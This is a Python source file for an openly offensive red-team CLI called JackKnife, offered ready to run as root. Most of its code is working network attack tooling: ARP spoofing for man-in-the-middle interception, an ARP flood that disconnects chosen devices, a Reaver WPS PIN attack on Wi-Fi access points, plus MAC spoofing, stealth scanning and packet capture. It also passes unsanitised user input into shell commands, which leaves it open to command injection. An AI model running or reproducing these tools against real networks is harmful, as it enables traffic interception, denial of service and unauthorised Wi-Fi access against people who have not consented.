#!/usr/bin/env python3
"""
JackKnife Toolkit - Red Team Cyberpunk CLI
Author: Niko DeRuise

USAGE:
    sudo python3 jackknife.py

REQUIREMENTS:
    - Python 3.x
    - scapy
    - nmap
    - net-tools
    - aircrack-ng suite
    - macchanger
    - tcpdump
    - iftop
    - whois
    - hostapd, dnsmasq
    - bluez (for Bluetooth tools)

DISCLAIMER:
    For authorized red team and educational use only.
"""

import os
import sys
import subprocess
import threading
import time
from scapy.all import ARP, Ether, srp, send
from datetime import datetime

arp_scan_cache = {}

def banner():
    knife = r"""
        ╔═══════════════════════════════════╗ 
        ║        🗡 JACKKNIFE TOOLKIT 🗡    ║ 
        ║   Offensive Cyber Recon + Attack  ║
        ╚═══════════════════════════════════╝
 
        [ JackKnife v1.0 ]
    """
    print(knife)

def pause():
    input("\n[↩] Press ENTER to return to main menu...")

def clear():
    os.system("clear" if os.name == "posix" else "cls")

# === TOOL: ARP Scanner ===
def arp_scanner():
    clear()
    print("[*] ARP Network Scanner")
    target = input("Enter network range (e.g. 192.168.1.0/24): ")
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target)
    ans, _ = srp(pkt, timeout=2, verbose=0)
    arp_scan_cache.clear()
    print("\nDiscovered Devices:")
    for _, r in ans:
        print(f"{r.psrc} - {r.hwsrc}")
        arp_scan_cache[r.psrc] = r.hwsrc
    pause()

# === TOOL: ARP Spoofing ===
def arp_spoof():
    clear()
    print("[*] ARP Spoofing / MITM")
    target = input("Target IP: ")
    gateway = input("Gateway IP: ")
    try:
        print("[*] Spoofing started... Press Ctrl+C to stop.")
        while True:
            send(ARP(op=2, pdst=target, psrc=gateway), verbose=0)
            send(ARP(op=2, pdst=gateway, psrc=target), verbose=0)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[x] Spoofing stopped.")
    pause()

# === TOOL: ARP Kick ===
def arp_kick():
    clear()
    print("[*] ARP Kick - Disconnect Devices")
    if not arp_scan_cache:
        print("[-] No ARP scan results. Run ARP Scanner first.")
        pause()
        return
    for i, (ip, mac) in enumerate(arp_scan_cache.items(), 1):
        print(f"[{i}] {ip} - {mac}")
    choice = input("Select target number: ")
    try:
        idx = int(choice) - 1
        target_ip = list(arp_scan_cache.keys())[idx]
    except:
        print("[!] Invalid selection.")
        pause()
        return
    gateway = input("Gateway IP: ")
    count = int(input("Number of packets (e.g. 150): ") or 150)
    for i in range(count):
        send(ARP(op=2, pdst=target_ip, psrc=gateway, hwdst="00:00:00:00:00:00"), verbose=0)
    print("[✓] Kick complete.")
    pause()

# === TOOL: Nmap Scanner ===
def nmap_scan():
    clear()
    print("[*] Nmap Scan")
    target = input("Enter IP or hostname: ")
    os.system(f"nmap -sS -Pn {target}")
    pause()

# === TOOL: WHOIS Lookup ===
def whois_lookup():
    clear()
    print("[*] WHOIS Lookup")
    target = input("Domain or IP: ")
    os.system(f"whois {target}")
    pause()

# === TOOL: Traceroute ===
def traceroute():
    clear()
    target = input("Target to trace: ")
    os.system(f"traceroute {target}")
    pause()

# === TOOL: MAC Changer ===
def mac_changer():
    clear()
    iface = input("Interface (e.g. eth0): ")
    new_mac = input("New MAC (blank=random): ")
    os.system(f"ifconfig {iface} down")
    if new_mac:
        os.system(f"macchanger -m {new_mac} {iface}")
    else:
        os.system(f"macchanger -r {iface}")
    os.system(f"ifconfig {iface} up")
    pause()

# === TOOL: Packet Sniffer ===
def packet_sniffer():
    clear()
    iface = input("Interface: ")
    output = input("Output file (e.g. capture.pcap): ")
    os.system(f"x-terminal-emulator -e 'tcpdump -i {iface} -w {output}'")
    pause()

# === TOOL: Bandwidth Monitor ===
def bandwidth_monitor():
    clear()
    os.system("x-terminal-emulator -e 'iftop'")
    pause()

# === TOOL: WPS Pixie Attack (Requires Reaver) ===
def wps_attack():
    clear()
    iface = input("Monitor mode interface (e.g. wlan0mon): ")
    bssid = input("Target BSSID: ")
    os.system(f"x-terminal-emulator -e 'reaver -i {iface} -b {bssid} -K 1 -vv'")
    pause()

# === TOOL: Bluetooth Scanner ===
def bluetooth_scan():
    clear()
    print("[*] Scanning Bluetooth devices...")
    os.system("hcitool scan")
    pause()

# === TOOL: Wordlist Builder ===
def wordlist_builder():
    clear()
    base = input("Base word (e.g. password): ")
    output = input("Output file: ")
    with open(output, "w") as f:
        for i in range(1000):
            f.write(f"{base}{i}\n")
    print(f"[✓] Wordlist saved to {output}")
    pause()

# === TOOL: Hidden File Finder ===
def hidden_file_finder():
    clear()
    path = input("Directory to scan: ")
    print("[*] Hidden files:")
    os.system(f"find {path} -type f -name '.*'")
    pause()

# === TOOL: Clipboard Hijacker (Linux Only) ===
def clipboard_hijack():
    clear()
    print("[*] Current clipboard contents:")
    os.system("xclip -selection clipboard -o")
    pause()

# === MENU ===
tools = {
    "1": ("ARP Scan", arp_scanner),
    "2": ("ARP Spoof", arp_spoof),
    "3": ("ARP Kick", arp_kick),
    "4": ("Nmap Scanner", nmap_scan),
    "5": ("WHOIS Lookup", whois_lookup),
    "6": ("Traceroute", traceroute),
    "7": ("MAC Changer", mac_changer),
    "8": ("Packet Sniffer", packet_sniffer),
    "9": ("Bandwidth Monitor", bandwidth_monitor),
    "10": ("WPS Pixie Attack", wps_attack),
    "11": ("Bluetooth Scan", bluetooth_scan),
    "12": ("Wordlist Builder", wordlist_builder),
    "13": ("Hidden File Finder", hidden_file_finder),
    "14": ("Clipboard Hijack", clipboard_hijack),
    "0": ("Exit", sys.exit)
}

def main():
    while True:
        clear()
        banner()
        print("\nSelect a tool:")
        for key, (name, _) in tools.items():
            print(f" [{key}] {name}")
        choice = input("\n> ")
        if choice in tools:
            tools[choice][1]()
        else:
            print("[x] Invalid selection.")
            time.sleep(1)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] Please run as root.")
        sys.exit(1)
    main()